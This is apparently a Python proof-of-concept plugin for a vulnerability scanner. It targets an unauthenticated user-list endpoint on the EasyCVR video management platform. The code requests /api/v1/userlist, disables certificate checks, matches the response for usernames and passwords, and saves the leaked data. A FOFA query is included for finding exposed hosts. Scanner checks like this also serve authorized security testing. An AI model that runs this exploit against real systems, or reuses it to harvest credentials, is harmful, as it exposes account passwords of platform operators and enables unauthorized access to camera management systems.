#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/nyJiEld7rFMunWe5hH332g',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'EasyCVR 视频管理平台用户信息泄露',

      'level'     :   'critical',

      'FOFA'      :   'title="EasyCVR"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/19',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/v1/userlist?pageindex=0&pagesize=10'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'count.*?ID.*?Name.*?Username.*?Password.*?RoleName',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret